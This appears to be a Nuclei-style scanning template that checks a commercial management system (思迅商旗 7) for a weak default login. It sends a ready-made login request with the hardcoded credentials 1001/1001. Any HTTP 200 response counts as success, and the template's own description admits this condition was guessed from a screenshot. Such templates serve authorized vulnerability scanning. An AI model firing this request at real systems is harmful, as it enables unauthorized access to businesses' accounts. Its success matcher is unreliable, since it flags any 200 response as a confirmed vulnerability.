id: poc-fa048f9ddec8c304fbe9
info:
  name: 思迅商旗商业管理系统7存在弱口令漏洞
  author: hacktwo
  severity: medium
  description: '[!] 推断说明: 状态码缺失, 推断为 200。原文响应特征为截图, 无法自动提取文本命中条件, 使用前请人工核验。'
  tags: default-login,2025
http:
- raw:
  - 'POST /api/Login/Login HTTP/1.1

    Host: {{Hostname}}

    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.77 Safari/537.36

    Content-Length: 68

    Accept: application/json, text/javascript, */*; q=0.01

    Accept-Encoding: gzip, deflate

    Accept-Language: zh-CN,zh;q=0.9,en;q=0.8,en-GB;q=0.7,en-US;q=0.6

    Cache-Control: no-cache

    Connection: close

    Content-Type: application/x-www-form-urlencoded; charset=UTF-8

    X-Requested-With: XMLHttpRequest


    id=1001&password=1001&onlineQuery=true'
  redirects: false
  matchers:
  - status:
    - 200
    type: status
